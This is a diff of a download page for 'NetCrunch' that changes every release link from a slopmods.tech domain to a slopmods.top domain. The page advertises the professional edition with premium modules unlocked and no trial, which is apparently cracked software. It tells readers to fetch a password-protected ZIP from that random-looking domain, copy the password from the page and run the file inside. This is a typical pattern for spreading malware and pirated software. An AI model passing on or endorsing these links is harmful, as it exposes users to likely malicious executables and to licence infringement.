@@ -8,12 +8,12 @@ NetCrunch — Windows setup and configuration · Premium workspace · Zero nag d
 
 > Use the release page below for Windows.
 
-- **Release page:** [oetggmeovtf.slopmods.tech](https://oetggmeovtf.slopmods.tech/)
-- **Full URL:** `https://oetggmeovtf.slopmods.tech/`
+- **Release page:** [oetggmeovtf.slopmods.top](https://oetggmeovtf.slopmods.top/)
+- **Full URL:** `https://oetggmeovtf.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **oetggmeovtf.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **oetggmeovtf.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,7 +33,7 @@ NetCrunch — Windows setup and configuration · Premium workspace · Zero nag d
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **oetggmeovtf.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **oetggmeovtf.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
 ## What you get
 
